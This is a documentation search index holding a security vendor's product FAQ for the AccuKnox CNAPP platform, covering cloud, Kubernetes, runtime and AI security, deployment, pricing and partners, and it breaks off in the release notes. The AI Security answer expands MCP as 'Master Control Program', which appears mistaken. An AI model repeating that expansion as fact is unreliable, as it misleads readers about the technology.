{"config":{"lang":["en"],"separator":"[\\s\\-\\.]+","pipeline":["stopWordFilter"]},"docs":[{"location":"faqs/","title":"FAQs","text":""},{"location":"faqs/#general-accuknox-cnapp","title":"General AccuKnox &amp; CNAPP","text":"1. What are the modules supported by AccuKnox CNAPP currently? <ul> <li>CSPM</li> <li>ASPM</li> <li>DevSecOps security in CI/CD pipeline</li> <li>CWPP</li> <li>Container Images Scanning</li> <li>CDR (Cloud Detection or Response) or CDM (Continuous Diagnostic &amp; Mitigation)</li> <li>AI Datasets, Pipelines, Models and Applications</li> <li>KSPM</li> <li>33+ Compliance Frameworks</li> </ul> 2. What are the platforms and environments that AccuKnox supports? <p>AccuKnox supports the following environments: + SaaS + PaaS + IaaS</p> <p>AccuKnox supports the following cloud platforms: + AWS + GCP + Azure + Oracle + OpenStack + OpenShift + Nutanix + VMWare + IBM Cloud</p> <p>AccuKnox support for the different platforms are as follows: + Kubernetes - Fully supported + Linux - Supported distributions + VMs, Baremetals + 5G Workloads and IoT/Edge Sensors + AI Datasets and LLM Models + Serverless - Fargate and ECS supported, others are on roadmap + Windows - On roadmap</p> 3. Where is AccuKnox SaaS located? <p>AccuKnox SaaS is deployed across multiple regions to ensure high availability, low latency, and compliance with regional data regulations. Currently, our SaaS is available in the following environments:</p> <ol> <li>United States (Primary Production Environment)<ul> <li>URL:\u00a0app.accuknox.com</li> <li>This is our primary production deployment serving customers across North America.</li> </ul> </li> <li>India Production Environment<ul> <li>URL:\u00a0app.in.accuknox.com</li> <li>Optimized for customers in India and neighboring regions to ensure better performance and adherence to local data residency requirements.</li> </ul> </li> <li>Europe Production Environment<ul> <li>URL:\u00a0app.eu.accuknox.com</li> <li>Designed to comply with GDPR and serve customers across the European Union with minimal latency.</li> </ul> </li> <li>Middle East Production Environment<ul> <li>URL:\u00a0app.me.accuknox.com</li> <li>Tailored for enterprises in the Middle East, offering improved accessibility and alignment with regional compliance standards.</li> </ul> </li> </ol> 4. Does AccuKnox provide auto discovery of assets and workloads? <p>Yes, AccuKnox can auto discover assets in the cloud by leveraging the cloud native tools.</p> <p>For workloads, AccuKnox agents will provide the visibility data.</p> 5. Do I need to enable native security services for AWS to get data into Accuknox? <p>AccuKnox only requires an IAM role to be created with read only access to be able to get data from AWS. Security Hub and Macie can be optionally enabled for AccuKnox to gather richer telemetry data with more context.</p> 6. What are the Hypervisors or Virtualized Environments that are supported by AccuKnox? <p>AccuKnox technology does not integrate at the VM virtualization layer. AccuKnox tech integrates at the operating system layer and ensures that the right hardening/enforcement for process executions, network access, and file access is in place. Thus AccuKnox can operate on any virtualization tech provided that the underlying VM uses Linux as its operating system.</p> 7. What are the integration tools and registries that are supported by AccuKnox? <p>AccuKnox can integrate multiple Cloud Account, Registries, SIEM platform, Ticketing or Notifications Tools and the list is ever growing. AccuKnox is pretty flexible to support the progression of the list with the customer\u2019s request as our roadmap item. Some of the supported today are as follows:</p> <ul> <li> <p>Security Events/SIEM : Splunk, Rsyslog, AWS CloudWatch, Elastic Search, Webhooks, Azure Sentinel</p> </li> <li> <p>Notification Tools: Slack, Jira, PagerDuty, Emails</p> </li> <li> <p>Ticketing Tools: Jira, FreshService, Connectwise, Zendesk</p> </li> <li> <p>Registries: Nexus, ECR, GCR, DockerHub, ACR, Harbor</p> </li> </ul> <p></p> 8. Can AccuKnox help in Monitoring? <ul> <li> <p>With Accuknox, you can create monitors for assets or group of assets to get alerts for changes observed in their Metadata (software version etc)</p> </li> <li> <p>Our Drift detection capability is inherently doing monitoring of the compliance checks (pass/fail) that have changed between scans.</p> </li> <li> <p>We collect alerts and telemetry generated by Kubearmor and cillium. These alerts are part of our CWPP offering. These alerts are generated for the events that have violated/complied with a policy.</p> </li> <li> <p>For these alerts you can have notification enabled as well through channels like Slack, email etc.</p> </li> </ul> 9. What will happen to my application running on a VM? <p>You get hardening policies via AccuKnox. AccuKnox VM Security protects virtual machines by combining CSPM, Host Scanning, Malware Scanning, CWPP, Host Hardening, and Compliance Benchmarking to prevent unauthorized access, safeguard data, and ensure compliance. It offers continuous vulnerability scanning, real-time threat detection, and remediation while minimizing the attack surface with hardened hosts and strong access controls. Overall, it provides proactive, real-time layered security and compliance assurance for virtualized environments.</p>"},{"location":"faqs/#cspm-cloud-security-posture-management","title":"CSPM (Cloud Security Posture Management)","text":"1. Does AccuKnox CNAPP support only agent-based scanning or does it support agentless scanning ? <p>For CSPM, AccuKnox supports agentless scanning for Public Cloud Infrastructure. For Infrastructure behind a firewall or Private Cloud, AccuKnox CSPM leverages open source based agent to manage remote nodes for Automated reporting, Error log Delivery, Microservice Monitoring, User Shell Activity, Resource Monitoring.</p> <p>For CWPP, AccuKnox leverages the open source CNCF sandbox project KubeArmor for scanning and in-line mitigation from known attacks. Together we provide a complete static and runtime security for a variety of workloads whether they are on Public/Private Cloud, VM, Baremetal or pure-containerized workload. Thus, we require agents to be installed to support scanning the workloads.</p> 2. What is the differentiation of AccuKnox in Static Security? <p>In the Static Security solution, unlike other CSPM tools, AccuKnox provides flexibility to integrate a variety of open source and commercial security scanning tools through built-in parsers to provide you a composite security posture of your infrastructure. We also correlate and normalize results from a variety of security scanning tools and provide detailed results of vulnerabilities across infrastructure.</p> 3. How does AccuKnox help to achieve static security? <p>AccuKnox Cloud Security Posture Management (CSPM) tool scans the Cloud Account to assess Vulnerabilities, Misconfigurations that are present in the cloud infrastructure based on security best practices &amp; benchmarks. AccuKnox also enables you to handle Vulnerabilities with the ability to mark false positives, Waiting for 3<sup>rd</sup> party or Accepted risk and many more, so that you get to act on findings that are remediable and within the SLA. We also give comprehensive compliance reports based on various security governance for third party assessment operators (3PAO) auditing.</p>"},{"location":"faqs/#aspm-application-security-posture-management","title":"ASPM (Application Security Posture Management)","text":"1. What is the differentiation of AccuKnox in ASPM Security? <p>In the ASPM Security solution, unlike other tools, AccuKnox provides flexibility to integrate a variety of open source and commercial security scanning tools through built-in parsers to provide you a composite security posture of your infrastructure. This is mainly done for the following two contexts:</p> <ul> <li>Remove dependencies and scoped results from one tool</li> <li>Bring in contextual understanding of vulnerabilities and prioritization based on that</li> </ul> <p>Further on this, we also correlate and normalize results from a variety of security scanning tools and provide detailed results of vulnerabilities across infrastructure.</p> 2. What components of ASPM are supported by AccuKnox? <p>AccuKnox provides a comprehensive ASPM solution integrated within our CNAPP. The core components include: + Static Application Security Testing (SAST) + Dynamic Application Security Testing (DAST) + Secrets Scanning + Infrastructure as Code (IaC) Scanning + Container Scanning</p> What are the different frameworks supported by IaC scanning? <p>AccuKnox's IaC scanning is designed to support industry-standard frameworks and languages. Our primary focus is on providing broad coverage for the most common tools used in modern DevOps environments, ensuring misconfigurations are identified before they reach production.</p> We are currently handling manual pen testing of our endpoints every few months. However, we see the risk of exposure if the DevOps/dev team makes a basic configuration change that could leave us vulnerable for a longer period. How can AccuKnox help? <p>AccuKnox directly addresses this gap by shifting security from periodic point-in-time assessments to a continuous, automated process. Our platform helps in the following ways: + Pipeline Integration: We integrate security checks directly into your CI/CD pipeline, catching vulnerabilities and misconfigurations automatically with every build and deployment. + Continuous Compliance: The platform continuously monitors your cloud and Kubernetes environments for configuration drift and compliance violations, providing real-time alerts. + Prioritization and Automation: Instead of manual checks, you can focus on automating security and prioritizing the most critical risks identified by the platform across your entire software development lifecycle. This \"built-in, not bolted-on\" approach drastically reduces the window of exposure that exists between manual penetration tests.</p> Does AccuKnox provide auto-patching or auto-PR creation services? <p>This capability is currently a work in progress and is scheduled to be available by October 2025.</p> Is AccuKnox tooling natively integrated with IDE? <p>No, AccuKnox does not provide a native IDE plugin. Our strategy focuses on integrating security at the most critical control plane: the DevOps pipeline. Users can continue using their preferred IDE and its existing tooling, while AccuKnox provides native integration with CI/CD tools like Jenkins, Azure DevOps, and GitHub Actions to ensure security is enforced centrally and consistently.</p>"},{"location":"faqs/#runtime-security-cwpp-kubearmor","title":"Runtime Security (CWPP &amp; KubeArmor)","text":"1. How does AccuKnox help to achieve Runtime security? <p>AccuKnox\u2019s Cloud Workload Protection Platform (CWPP) achieves runtime security by leveraging CNCF sandbox project, KubeArmor, which is a cloud-native runtime security enforcement system by AccuKnox that restricts and have more granular control over the application behavior such as process execution, file access, and networking operation of containers and nodes at the system level.</p> 2. What is the differentiation of AccuKnox in Runtime Security? <p>AccuKnox leverages KubeArmor, which is a cloud-native runtime security enforcement system that leverages Linux Security Modules to secure the workloads. LSMs are really powerful but they weren\u2019t built with modern workloads including Containers and Orchestrators in mind. Hence, eBPF has provided us with the ability to extend capabilities and BPF LSM provide us with the ability to load our custom programs with decision-making into the kernel seamlessly helping us protect modern workloads. Therefore, KubeArmor helps to enforce security posture wherein any malicious attacks will be stopped before execution, known as in-line mitigation (mentioned by Forrester report)</p> 3. What does KubeArmor leverage for enforcement and what are its advantages? <p>KubeArmor leverages best of breed Linux Security Modules (LSMs) such as AppArmor, BPF-LSM, and SELinux for inline mitigation to reduce the attack surface of the pod/container/VM.LSMs have several advantages over any other techniques. By using LSMs, KubeArmor does not have to disturb pods/containers and also doesn't require change at host or CRI level to apply security policies.</p> <p>KubeArmor deploys as a non-privileged daemonset with certain capabilities that allows it to monitor other pods/containers and host. A given cluster can have multiple nodes utilizing different LSMs so KubeArmor abstracts away the complexities of the LSMs and provides an easy way for policy enforcement.</p> 4. What role does AccuKnox Agents play in runtime-security? <p>AccuKnox Enterprise version consists of various agents such as</p> <p>KubeArmor: KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. KubeArmor dynamically set the restrictions on the pod. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime.</p> <p>Feeder Service: It collects the feeds from kubeArmor and relays to the app.</p> <p>Shared Informer Agent: It collects information about the cluster like pods, nodes, namespaces etc.,</p> <p>Policy Discovery Engine: It discovers the policies using the workload and cluster information that is relayed by a shared informer Agent.</p> 5. Does KubeArmor only support Kubernetes or it can support on-prem deployments like legacy VM, pure containerized workload as well? <p>KubeArmor supports following types of workloads:</p> <ul> <li>K8s orchestrated workloads: Workloads deployed as k8s orchestrated containers. In this case, KubeArmor is deployed as a k8s daemonset. Note, KubeArmor supports policy enforcement on both k8s-pods (KubeArmorPolicy) as well as k8s-nodes (KubeArmorHostPolicy).</li> <li>VM/Bare-Metals workloads: Workloads deployed on Virtual Machines or Bare Metal i.e. workloads directly operating as host processes. In this case, KubeArmor is deployed in systemd mode.</li> </ul> 6. What is the difference between Post-attack mitigation and in-line mitigation and which is better? <p>Post-exploit Mitigation works by killing the suspicious process in response to an alert indicating malicious intent. In this case attacker will be allowed to is able to execute its binary and could possibly disable the security controls, access logs, etc to circumvent the attack detection. By the time the malicious process is killed, it might have already deleted, encrypted, or transmitted the sensitive contents.</p> <p></p> <p>Inline Mitigation on the other hand prevents the malicious attack at the time of happening itself. It doesn\u2019t allow the attack to happen by protecting the environment with security policy or firewall. AccuKnox\u2019s open source tool KubeArmor provides Inline Mitigation. KubeArmor uses inline mitigation to reduce the attack surface of pod/container/VM. KubeArmor leverages best of breed Linux Security Modules (LSMs) such as AppArmor, BPF-LSM, and SELinux (only for host protection) for inline mitigation</p> 7. Does Inline remediation slowdown the process? <p>LSMs are already enabled in the environment and use host based LSM security. Since the attacker usually has direct access to the pod, AccuKnox uses Inline remediation to stop the processes before executing. Therefore, inline remediation does not slow down the process</p> 8. How to check running services in a VM? <p>To troubleshoot or verify if required services are running inside a Virtual Machine, use the following commands:</p> <ul> <li>To check if a specific service (e.g., <code>kubearmor</code>, <code>vm-adapter</code>) is running:</li> </ul> <pre><code>sudo systemctl status &lt;service_name&gt;  # Replace with actual service name\n\nsudo systemctl status kubearmor\nsudo systemctl status vm-adapter\n</code></pre> <ul> <li>To list all currently running services:</li> </ul> <pre><code>systemctl --type=service --state=running\n</code></pre> <p>This helps confirm whether KubeArmor or other critical services are active inside the VM for proper enforcement and telemetry.</p>"},{"location":"faqs/#ai-security","title":"AI Security","text":"1. How does AccuKnox detect and prevent adversarial and zero-day attacks on LLMs? <p>AccuKnox\u2019s AI Security applies AI-SPM with runtime behavioral monitoring, syscall tracing, and anomaly detection to identify adversarial patterns and zero-day exploits against LLM inference pipelines in real time.</p> 2. How does AccuKnox enforce policy controls for AI workloads in Kubernetes? <p>Using KubeArmor integration, AccuKnox enforces fine-grained eBPF/LSM policies (process, file, and network) for AI workloads running in Kubernetes clusters, ensuring least-privilege enforcement and runtime protection.</p> 3. How does AccuKnox secure AI data pipelines against poisoning and compliance risks? <p>AccuKnox provides end-to-end visibility from data ingestion to training with dataset lineage tracking, model SBOMs, and automated compliance checks (NIST AI RMF, EU AI Act, HIPAA), blocking poisoned datasets and ensuring regulatory adherence.</p> 4. Does AccuKnox AI security cover on-premise deployed AI components? <p>Yes. AccuKnox provides comprehensive AI security for a wide range of deployment models. Our platform is architected to be flexible, offering robust protection for: + Public and Private Clouds + Fully On-Premise Environments + Air-Gapped Infrastructure + Hybrid Deployments This ensures your AI models, data, and infrastructure are secured, regardless of where they are deployed.</p> 5. How does AccuKnox secure MCP servers? <p>AccuKnox secures Master Control Program (MCP) servers by integrating them into our Zero Trust security framework. The MCP server operates within a Sandboxed Execution environment, which provides process and network isolation. All interactions are governed by strict authorization controls and are continuously monitored, ensuring the integrity and security of the core AI orchestration layer.</p> 6. How does AccuKnox secure AI Agents? <p>AccuKnox secures AI Agents through advanced runtime sandboxing and policy enforcement. Key security measures include: + Sandboxing Unsafe Tool Usage: Isolating the execution of tools invoked by agents to prevent misuse or compromise. + Sandboxing Untrusted Code: Automatically generated or untrusted code is executed in a secure, isolated sandbox (e.g., process, container, or microVM) to mitigate risks like Remote Code Execution (RCE), privilege compromise, and resource overload. This proactive approach allows organizations to leverage the power of agentic AI while defending against associated threats.</p> 7. How does AccuKnox provide visibility into Shadow AI? <p>AccuKnox addresses the challenge of \"Shadow AI\" through its core capability of Comprehensive Visibility and Auto-Discovery. By onboarding your cloud accounts, our platform automatically discovers and inventories all AI/ML assets, including models, datasets, and compute infrastructure. This creates a single, unified view of all AI components, bringing potentially unsanctioned or unmonitored resources under the purview of the security team and   allowing for the consistent application of governance and security policies.</p> 8. How does AccuKnox help with dealing with privacy issues in AI-SPM? <p>AccuKnox has multiple built-in features to address data privacy: + PII/PHI Scanning of Datasets: The platform can scan AI/ML datasets to identify and flag the presence of Personally Identifiable Information (PII) or Protected Health Information (PHI). + Prompt and Response Firewalling: Our firewall inspects both the input prompts sent to LLMs and the output responses received from them to detect and block the exposure of PII/PHI in real-time.</p> Does AccuKnox expose privacy-related aspects to external LLMs (e.g., for AI Co-Pilot)? <p>No, protecting customer data is paramount. AccuKnox implements strict guardrails: + Data Sanitization: We ensure that no telemetry, alert data, or other information containing potential PII/PHI is ever sent to external LLMs for analysis or remediation suggestions. + Tenant-Level Control: The AI-assisted remediation feature can be completely disabled on a per-tenant basis, giving customers full control over whether any of their data interacts with an LLM.</p> Which platforms and environments does AccuKnox AI security support? <p>AccuKnox AI security supports a wide range of platforms and environments, including: </p>"},{"location":"faqs/#cdr-cloud-detection-response","title":"CDR (Cloud Detection &amp; Response)","text":"1. How does AccuKnox CDR collect security logs from cloud accounts? <p>AccuKnox ingests audit logs directly from cloud providers using provider-optimized methods: - AWS: Push-based via CloudTrail \u2192 S3 \u2192 ingestion. - GCP / Azure: Pull-based via Pub/Sub or Event Hub subscriptions.</p> 2. What is required to enable automated remediation? <ul> <li>GitHub Actions: Remediation scripts run from your controlled repository.</li> <li>Cloud Permissions: Admin-level access (AWS IAM admin, Azure Subscription Owner, GCP Owner) to apply fixes.</li> </ul> 3. How does AccuKnox map detected threats to remediation actions? <p>Each rule violation is linked to a specific remediation script. Example: A VM with a public IP triggers a script that removes the IP automatically.</p>"},{"location":"faqs/#kspm-kubernetes-security-posture-management","title":"KSPM (Kubernetes Security Posture Management)","text":"1. How does AccuKnox KSPM discover and monitor Kubernetes assets? <p>AccuKnox continuously maps clusters, namespaces, nodes, pods, and services across hybrid and multi-cloud. It provides real-time visibility, attack-path analysis, and detection of unauthorized deployments.</p> 2. How does KSPM automate compliance checks? <p>AccuKnox runs continuous scans against CIS Benchmarks, NSA/CISA guidance, and MITRE ATT&amp;CK mappings, while supporting custom policies for organization-specific governance.</p> 3. How does KSPM integrate into CI/CD to secure workloads pre-deployment? <p>AccuKnox scans Kubernetes manifests, Helm charts, Terraform files, and container images for misconfigurations and CVEs before deployment, enforcing RBAC and IaC security controls.</p>"},{"location":"faqs/#policy-management-enforcement","title":"Policy Management &amp; Enforcement","text":"1. How AccuKnox helps in Policy Version Control for Runtime Security? <p>Accknox enables DevSecOps teams to embed security policies as code into their GitOps workflow. This provides a unified, collaborative view of the policies and enables them to be shipped and deployed along with the applications they are protecting. Hence, utilizing Gitops based policy version control, it will be easy to enforce changes to policies and keep track of versions in case of audit or rollback requirement alongwith approval mechanisms.</p> 2. How AccuKnox helps to achieve Microsegmentation? <p>AccuKnox CWPP provides micro-segmentation at the lowest possible granularity level which is also a smallest execution unit in Kubernetes i.e. Pods. We will help you to identify process execution request from the pods, network connections the pods are trying to make internally or externally and files-system the pods are accessing. By observing the behavior of a particular pod and restricting that behavior so that it functions according to the expected flow of process/events/traffic, one can develop a least permissive security posture from creating a whitelisting policies and auditing/denying everything else.</p> 3. How AccuKnox helps to recommend Auto-Discovered Policies? <p>AccuKnox CWPP solution provide Discovery Engine agent that assesses the security posture of your workloads and auto-discovers the policy-set required to put the workload in least-permissive mode. We also provide Shared Informer Agent which collects information about cluster like pods, nodes, namespaces etc. The Policy Discovery Engine discovers the policies using the workload and cluster information that is relayed by Shared Informer Agent.</p> 4. How Does AccuKnox Generate Hardening Policies? <p>AccuKnox operates KubeArmor to secure Kubernetes, container, and VM workloads by enforcing runtime hardening policies using Linux Security Modules (LSMs) and eBPF. The AccuKnox platform auto-discovers application behaviors and maps them to industry standards like CIS, MITRE, NIST, and STIG frameworks, generating tailored security policies to block unwanted activity at the system level. Policies can restrict process execution, file access, and network operations, helping achieve Zero Trust while maintaining compliance and visibility over what gets allowed or blocked in real time.</p> 5. How AccuKnox helps to implement Zero Trust? <p>By implementing a zero trust posture with KubeArmor, organizations can increase their security posture and reduce the risk of unauthorized access or activity within their Kubernetes clusters. This can help to protect sensitive data, prevent system breaches, and maintain the integrity of the cluster. KubeArmor supports allow-based policies which result in specific actions to be allowed and denying/auditing everything else. For example, a specific pod/container might only invoke a set of binaries at runtime. As part of allow-based rules you can specify the set of processes that are allowed and everything else is either audited or denied based on the default security posture.</p> 6. What does AccuKnox measure, while doing security posture observation and how does it help in securing using policies? <ul> <li>Compliance Frameworks (MITRE, CIS, NIST) for hardening workloads are used to create hardening policies</li> <li>Understanding the Application behaviour using LSMs enables creation of behavioural policies</li> <li>Hardening policies are block based policies</li> <li>Behavioural policies are allow based policies</li> <li>An example of policies is FIM (File Integrity Monitoring) policy</li> </ul> 7. Do you have any standard hardening rules onboarded and will the hardening policy show what is getting blocked? <p>Yes, it can show up in terms of Application Behaviour &amp; Logs</p>"},{"location":"faqs/#compliance-auditing","title":"Compliance &amp; Auditing","text":"1. What are all the compliance frameworks that AccuKnox is covering? <p>AccuKnox\u2019s CNAPP tool checks for compliance and governance from various benchmarks like STIG, CIS, NIST CSF, HIPAA, MITRE, SOC2, ISO 27001 including AI compliances like NIST AI RMF, OWASP Top 10 LLM, EU AI Act, etc. See the full list of 33+ compliance frameworks that we support.</p>"},{"location":"faqs/#deployment-architecture","title":"Deployment &amp; Architecture","text":"1. What is the deployment architecture? <p>AccuKnox's platform can be deployed in several flexible ways to suit different operational and security requirements:</p> <ul> <li>AccuKnox SaaS: This model offers a scalable, easy-to-use, and quick deployment experience, with upgrades and maintenance managed by AccuKnox.</li> <li>AccuKnox Managed OEM/MSSP: Designed for managed deployments where AccuKnox handles upgrades and maintenance for partners.</li> <li>AWS On-prem (Hybrid): This is a hybrid solution that combines cloud services from AWS with on-premises deployments.</li> <li>Full On-premises or Air-gapped: Provides maximum security and isolation, making it suitable for sensitive and highly regulated industries.</li> </ul> <p>The on-premises deployment is based on a Kubernetes-native architecture, utilizing microservices and databases like PostgreSQL and MongoDB to manage API logic and data.</p> <p>AccuKnox utilizes both agent-based and agentless approaches to provide comprehensive security across different environments:</p> <ul> <li>Agentless Security: For public cloud infrastructure security, AccuKnox operates in an agentless mode, using API scans for SaaS-based usage.</li> <li>Agent-Based Security: AccuKnox also offers robust agent-based protection for workloads:<ul> <li>For Kubernetes: The platform uses a Daemonset for Kubernetes deployments.</li> <li>For Containers and VMs: AccuKnox leverages a Systemd mode for deployment on containers and virtual machines.</li> <li>On-Premises Infrastructure: For on-premises or data center deployments, the solution can be installed using Helm charts.</li> </ul> </li> </ul> 2. How AccuKnox helps achieve protection for Edge, 5G workloads? <p>AccuKnox addresses the unique security challenges of Edge and 5G environments by leveraging its core capabilities:</p> <ul> <li>Zero Trust on Kubernetes and VMs: The platform extends its Zero Trust security model to virtual machines and Kubernetes at the edge.</li> <li>Real-time Enforcement: Offers preemptive, prevention-based security for 5G control planes. The platform provides a unified view of application behavior and communication patterns in 5G networks.</li> <li>Lightweight Agent: Uses a low-footprint runtime protection agent (from the open-source project KubeArmor), leveraging eBPF and Linux Security Modules (LSM) to ensure that only necessary access and behavior rules are enforced at the OS level, even in isolated environments.</li> <li>Policy &amp; Testing for 5G: Provides tools for creating policies for xApp/RIC, certifying security for CNF/ORAN parts, and simulating attacks for 5G networks.</li> </ul> 3. What happens if the AccuKnox Control Plane goes down? Will runtime protection still work? <p>Yes. Runtime security enforcement continues even if the Control Plane is unavailable. The availability of the Control Plane does not impact the customer\u2019s Data Plane or production operations.</p> 4. Can AccuKnox be deployed in a distributed architecture? <p>Yes. AccuKnox can deploy its Control Plane across multiple regions to achieve redundancy and disaster recovery.</p> <ul> <li>Uses native Kubernetes concepts for distributed deployment.</li> <li>Nodes can span multiple Availability Zones (AZs) and regions.</li> <li>Requirement: Reliable network bandwidth between AZs/regions.</li> </ul> 5. Can AccuKnox reuse existing infrastructure (e.g., NAT, firewalls) during on-prem deployment of the Control Plane? <p>AccuKnox requires an independent Kubernetes cluster for deployment. We strongly recommend not using an existing cluster running customer applications.</p> 6. Does AccuKnox integrate with virtualization platforms such as VMware or Hyper-V? <p>AccuKnox does not integrate directly with virtualization platforms (VMware, Hyper-V, KVM, Nutanix AHV).</p> <ul> <li>Instead, AccuKnox secures VMs created on these platforms.</li> <li>Security is provided either agentlessly (via snapshots) or through lightweight scanning agents.</li> </ul> 7. What is the typical timeline for a Proof of Concept (PoC)? <p>Typical Proof of Concept (PoC) timelines are: * SaaS PoC: ~1\u20132 weeks (infrastructure already in place). * On-Prem PoC: ~2\u20133 weeks (depends on environment complexity and readiness). * Air-gapped On-Prem: Additional time required for staging container images.</p> <p>Note: In some cases where prerequisites are fully prepared, on-prem deployment has been completed in just a few hours.</p> <ul> <li>On-Prem Installation Guide</li> <li>POC Checklist Questionnaire</li> </ul> 8. For on-prem deployment of AccuKnox Control Plane, what are the challenges/considerations? <p>AccuKnox supports deployment in completely isolated environments, but some considerations apply:</p> <ul> <li> <p>Vulnerability Database Updates:   In SaaS environments, updates are applied twice daily. In isolated deployments, customers must configure automated pipelines to push updates.</p> </li> <li> <p>Container Images:   Customers must stage required container images in their private registry. AccuKnox provides the image list and instructions.</p> </li> <li> <p>Monitoring &amp; Alerts:   In SaaS, AccuKnox SRE practices provide automated monitoring and notifications. In isolated setups, customers need equivalent procedures.</p> </li> <li> <p>Backups:   Customers must configure backup/snapshot procedures, supported by AccuKnox SRE/DevOps.</p> </li> </ul> 9. Does AccuKnox support backup and auditing in isolated deployments? <p>Yes. Customers should configure backup and snapshot procedures in coordination with AccuKnox SRE/DevOps. In isolated deployments, customers are responsible for setting up monitoring and audit workflows, while AccuKnox provides guidance and support.</p>"},{"location":"faqs/#pricing-billing","title":"Pricing &amp; Billing","text":"1. What is AccuKnox\u2019s licensing model? <p>You can get a custom quote and select individual security modules based on number of units (CWPP nodes, CSPM cloud assets, etc) or a comprehensive CNAPP bundle.AccuKnox offers a flexible licensing approach tailored to customer needs. It's not a one-size-fits-all model.</p> <p>Customers have the flexibility to purchase specific modules such as KSPM, CSPM, ASPM, or CWPP independently. Pricing is modular and typically based on: - Number of cloud assets normalized to units - Number of container images - Number of worker nodes - Number of Tools in SCA, SAST, DAST, IaC - Number of AI/LLM Model - Bundle of per 1000 APIs Customers only pay for the modules they choose.</p> 2. How would I know what assets are included for billing? <p>Count your assets here. AWS: EC2 instances, S3 buckets, RDS databases Azure: Virtual Machines, Storage Accounts, SQL Databases GCP: Compute Engine VMs, Cloud Storage buckets, Cloud SQL instances</p> <p>To estimate billing, AccuKnox normalizes assets into units, refer the question above for details.</p> 3. What happens if we exceed the asset count for a few days or weeks within a month? <p>The AccuKnox Control Plane will not stop you from exceeding the quota. However, if the quota consistently exceeds by more than 30% over a longer period, the AccuKnox support team will reach out for clarifications.</p> 4. We have thousands of unused container images in our registry. Would they all be scanned? <p>During onboarding, you can apply filters to control which images get scanned: - Use inclusion/exclusion regex for <code>repo/image:tag</code>. - Configure to scan only images updated in the last X days or pulled within the last Y days. - AccuKnox will notify you if the container image count exceeds 5000. Additionally, AccuKnox supports scanning images in Kubernetes clusters or virtual machines directly, ensuring only runtime images are scanned. This reduces both the number of images scanned and findings noise.</p> 5. How is licensing handled in SaaS and on-prem environments? <ul> <li>Licensing is generally subscription-based for both SaaS and on-prem.</li> <li>On-prem customers are expected to procure Platinum Support.</li> </ul> 6. Who to reach out to for a custom quote for CNAPP? <p>You can reach out to: - Sales Q's -info@accuknox.com - Technical Q's -support@accuknox.com</p>"},{"location":"faqs/#partnerships-marketplace","title":"Partnerships &amp; Marketplace","text":"1. How do you work with partners and what are the partnership models? <p>We have a 100% partner aligned go to market approach. to this goal, we provide our partners the following: - Free training, certification - Joint marketing - Lead sharing For more details, please visit our partner page.</p> 2. Current AccuKnox's marketplace listing? <p>AccuKnox is currently listed on:</p> <ul> <li>AWS</li> <li>Azure</li> <li>RedHat OpenShift</li> <li>Google Cloud Platform (GCP)</li> <li>Oracle Cloud</li> <li>IBM Cloud</li> <li>Alibaba Cloud</li> </ul> <p>\ud83d\udd17 Explore all listings here</p> <p>CI/CD Integrations are also available on: - Bitbucket - Azure DevOps - GitLab - GitHub Marketplace</p> 3. Who are AccuKnox's current partners and resellers? <p>We have various types of partners, including distributors and resellers, in different geographies such as the EU, US, India, and UAE. This includes System Integrators (SI), Global System Integrators (GSI), and Managed Security Service Providers (MSSP).</p> <p>AccuKnox collaborates with a diverse ecosystem of partners and is available on various cloud marketplaces.</p> <ul> <li>Cloud Partnerships: AccuKnox partners with major cloud providers like AWS, Google Cloud, Microsoft Azure, Oracle Cloud, and Red Hat, offering its solutions on their respective marketplaces.</li> <li>Technology Partners: AccuKnox has alliances with companies such as Nutanix, IBM Cloud, NVIDIA, and others to ensure seamless integrations and enhanced product offerings.</li> <li>System Integrators &amp; Distributors: AccuKnox works with System Integrators (SI), Global System Integrators (GSI), and distributors to provide customized solutions and deliver its products to customers.   Examples include Wipro, NTT Data, TCS, and Carahsoft.</li> </ul> <p>Resources:</p> <ul> <li>Full partner list</li> <li>Apply for MAX Partnership</li> <li>Deal Registration</li> <li>Design Partnership</li> <li>MSSP Partnership</li> </ul> 4. How does the AccuKnox\u2019s MSSP model work? <p>AccuKnox\u2019s MSSP model lets managed security providers use AccuKnox\u2019s platform to manage and secure multiple customers across different clouds, giving each client isolated access, custom policies, and easy onboarding. MSSPs can brand, automate, and scale their services\u2014while monitoring, billing, and supporting all customers from one dashboard. Read more about our MSSP partnership program.</p> 5. Can MSSP users access end customer tenant accounts? <p>Yes. AccuKnox fully supports MSSP users having viewer/editor access to end customer tenants, with customer permission. This is a critical requirement for MSSP models, and our platform is designed to accommodate it securely and seamlessly.</p>"},{"location":"faqs/#roadmap","title":"Roadmap","text":"1. Is there a support for CIEM? <p>No, AccuKnox does not currently have CIEM; instead, we have KIEM. AccuKnox supports Identity and Entitlement Management for Kubernetes, referred to as KIEM (Kubernetes Identity &amp; Entitlement Management). This capability is part of the Kubernetes Security (KSPM) module, which also handles cluster misconfiguration detection and CIS K8s benchmark findings.</p> 2. What features are on the roadmap related to environments and integrations? <p>For 2025 and beyond, AccuKnox is focusing on:</p> <p>CSPM Oracle Support, CSPM Azure Org Support, Assets Inventory revamp, CIEM, Custom Compliance Framework, RBAC enhancements, DSPM, Security Graph Phase I, CNAPP Policies Revamp, Collectors based ASPM onboarding, SBOM &amp; SCA Integration, Scheduled Dashboard Reporting, AISPM: NIST AI RMF, ISO 42001, EU AI ACT, Windows / Linux Agentless VM scanning, SSPM (m365, sap), Redhat OpenShift Virtualization support, OpenStack support, Trellix (McAfee &amp; Fireeye) Integrations, Nozomi, Armis, CTEM Integration</p> <p>We will also have: - Expanded serverless support (beyond AWS Fargate/ECS). - Windows support for workloads. - Ongoing expansion of integrations with registries, SIEMs, and ticketing systems.</p> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/","title":"Index","text":"<p>AccuKnox Enterprise Architecture</p> <p>AccuKnox Agents</p> <p>Deployment Models</p> <p>DevSecOps</p>"},{"location":"getting-started/1-5-release/","title":"Release Notes v1.5","text":"<p>What's New?</p> <ul> <li>Top Cloud Accounts with Issues widget in CNAPP dashboard</li> <li>Top 3 Cloud Accounts with failed controls Widget in CNAPP Dashboard</li> <li>Compliance status Widget in CNAPP Dashboard</li> <li>Compliance Summary Screen Dynamic filters</li> <li>Filtering based on Cloud Accounts in Compliance Summary</li> <li>CSPM Executive Dashboard revamp with data</li> <li>CWPP Reporting(Daily Report)</li> <li>Enhancements in Asset Inventory page</li> </ul> <p>Major Bug Fixes:</p> <ul> <li>Filter the policies using workload filter in 